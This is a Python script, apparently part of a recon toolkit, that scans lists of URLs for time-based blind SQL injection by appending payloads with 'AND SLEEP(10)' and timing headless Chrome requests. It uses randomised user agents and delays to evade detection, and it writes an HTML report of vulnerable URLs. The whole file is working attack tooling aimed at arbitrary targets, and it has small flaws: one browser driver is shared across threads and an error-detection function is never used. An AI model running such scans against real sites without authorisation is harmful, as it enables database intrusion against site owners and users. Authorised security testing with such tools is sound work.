#!/usr/bin/python3

import os
import sys
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from datetime import datetime

import urllib3
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, WebDriverException

# Initialize colorama
init(autoreset=True)

# User-agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
]

def setup_selenium_driver():
    """Setup and return a Selenium Chrome WebDriver with appropriate options."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run Chrome in headless mode
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-background-timer-throttling")
    chrome_options.add_argument("--disable-backgrounding-occluded-windows")
    chrome_options.add_argument("--disable-renderer-backgrounding")
    chrome_options.add_argument("--disable-software-rasterizer")

    # Randomize the user-agent for each session
    random_user_agent = get_random_user_agent()
    chrome_options.add_argument(f"user-agent={random_user_agent}")

    # Suppress logs by directing log output to os.devnull
    driver_service = ChromeService(ChromeDriverManager().install(), log_path=os.devnull)
    
    # Set log level to fatal errors only
    chrome_options.add_argument("--log-level=3")

    driver = webdriver.Chrome(service=driver_service, options=chrome_options)
    
    # Set page load and script timeouts
    driver.set_page_load_timeout(40)
    driver.set_script_timeout(40)

    return driver

def get_random_user_agent():
    """Return a random user-agent string."""
    return random.choice(USER_AGENTS)

def perform_request_selenium(driver, url, payload, cookie):
    """
    Perform a request using Selenium WebDriver to test for Time-Based Blind SQLi vulnerability.

    Args:
        driver (WebDriver): Selenium WebDriver instance.
        url (str): Target URL to scan.
        payload (str): SQL injection payload to use.
        cookie (str): Optional cookie to be sent with the request.

    Returns:
        (str, bool): URL with payload, and vulnerability status.
    """
    target_url = f"{url}{quote(payload, safe='')}"
    print(Fore.CYAN + f"[→] Scanning URL: {target_url}")  # Print the URL being scanned

    try:
        if cookie:
            driver.get("about:blank")
            driver.add_cookie({"name": "cookie", "value": cookie, "path": "/"})

        # Collect baseline response time (without payload)
        start_time = time.time()
        driver.get(url)  # Normal request without SQLi payload
        end_time = time.time()
        baseline_response_time = end_time - start_time

        print(Fore.CYAN + f"[i] Baseline response time: {baseline_response_time:.2f} seconds")

        # Time-based SQLi detection with multiple trials
        time_based_payload = f"{url}{quote(payload + ' AND SLEEP(10)', safe='')}"  # Using 10-second sleep
        confirmed_vulnerable = False

        total_trials = 3  # Number of trials to run
        consistent_delay_count = 0

        for attempt in range(total_trials):  # Run multiple trials for confirmation
            # Adding a random delay between 1 and 3 seconds between each request
            time.sleep(random.uniform(1, 3))

            # Send request with the time-based SQLi payload
            start_time = time.time()
            driver.get(time_based_payload)
            end_time = time.time()
            injected_response_time = end_time - start_time

            delay_detected = injected_response_time - baseline_response_time
            print(Fore.CYAN + f"[i] Injected response time: {injected_response_time:.2f} seconds (delay: {delay_detected:.2f} seconds)")

            # Consider a URL vulnerable if the delay is close to 10 seconds (± 2 seconds)
            if delay_detected >= 8:
                consistent_delay_count += 1

        if consistent_delay_count >= 2:  # Require at least 2 consistent delays to confirm vulnerability
            confirmed_vulnerable = True

        if confirmed_vulnerable:
            print(Fore.GREEN + f"[✓] Time-Based Blind SQLi Confirmed: {target_url}")
            return target_url, True

        print(Fore.RED + f"[✗] Not Vulnerable: {target_url}")
        return target_url, False

    except TimeoutException:
        print(Fore.YELLOW + f"[!] Timeout occurred while scanning {target_url}")
        return target_url, False

    except WebDriverException as e:
        if "ERR_CONNECTION_RESET" in str(e):
            print(Fore.YELLOW + f"[!] Connection reset for {target_url}, skipping...")
            return target_url, False
        else:
            print(Fore.RED + f"[!] WebDriverException: {str(e)}")
            return target_url, False


def detect_sql_error_in_response(page_content):
    """
    Detect common SQL error messages in the response content.

    Args:
        page_content (str): HTML content of the page.

    Returns:
        bool: True if an SQL error message is found, otherwise False.
    """
    sql_errors = [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark after the character string",
        "Microsoft OLE DB Provider for SQL Server",
        "Invalid SQL statement",
        "SQLSTATE[",
        "MySQL server version for the right syntax",
        "PostgreSQL query failed",
        "Unexpected token near"
    ]
    for error in sql_errors:
        if error in page_content:
            return True
    return False

def save_results(vulnerable_urls, total_found, total_scanned, start_time):
    """Save the scan results to an HTML report in the specified output folder."""
    output_dir = os.path.expanduser("~/aungrecon/output/bsqli_results")  # Define main output directory
    filename = os.path.join(output_dir, "bsqli_report.html")  # Full path for bsqli_report.html
    os.makedirs(output_dir, exist_ok=True)

    html_content = generate_html_report("Blind SQL Injection", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
    with open(filename, 'w') as f:
        f.write(html_content)
    print(Fore.GREEN + f"[✓] Report saved as {filename}")

def generate_html_report(scan_type, total_found, total_scanned, time_taken, vulnerable_urls):
    """Generate a simple HTML report for vulnerabilities found."""
    html_content = f"""
    <html>
    <head><title>{scan_type} Report</title></head>
    <body>
        <h1>{scan_type} Report</h1>
        <p>Total Found: {total_found}</p>
        <p>Total Scanned: {total_scanned}</p>
        <p>Time Taken: {time_taken} seconds</p>
        <h2>Vulnerable URLs</h2>
        <ul>
            {"".join(f'<li>{url}</li>' for url in vulnerable_urls)}
        </ul>
    </body>
    </html>
    """
    return html_content

def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Scanner with Selenium")
    parser.add_argument("-p", "--payload-file", required=True, help="Path to the file containing SQLi payloads")
    parser.add_argument("-u", "--url-file", required=True, help="Path to the file containing URLs to scan")
    parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request (optional)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads (default is 5)")

    args = parser.parse_args()

    try:
        with open(args.url_file, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] URL file not found: {args.url_file}")
        sys.exit(1)

    try:
        with open(args.payload_file, 'r') as file:
            payloads = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Payload file not found: {args.payload_file}")
        sys.exit(1)

    if not urls or not payloads:
        print(Fore.RED + "[!] URLs and Payloads cannot be empty.")
        sys.exit(1)

    # Initialize scan state
    scan_state = {
        'vulnerability_found': False,
        'vulnerable_urls': [],
        'total_found': 0,
        'total_scanned': 0
    }

    print(Fore.CYAN + "[i] Starting Blind SQLi Scan...")

    start_time = time.time()
    driver = setup_selenium_driver()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for url in urls:
            for payload in payloads:
                futures.append(executor.submit(perform_request_selenium, driver, url, payload, args.cookie))

        for future in futures:
            url_with_payload, vulnerability_detected = future.result()
            if vulnerability_detected:
                scan_state['vulnerable_urls'].append(url_with_payload)
                scan_state['total_found'] += 1
            scan_state['total_scanned'] += 1

    # Save results
    save_results(scan_state['vulnerable_urls'], scan_state['total_found'], scan_state['total_scanned'], start_time)
    driver.quit()

if __name__ == "__main__":
    main()
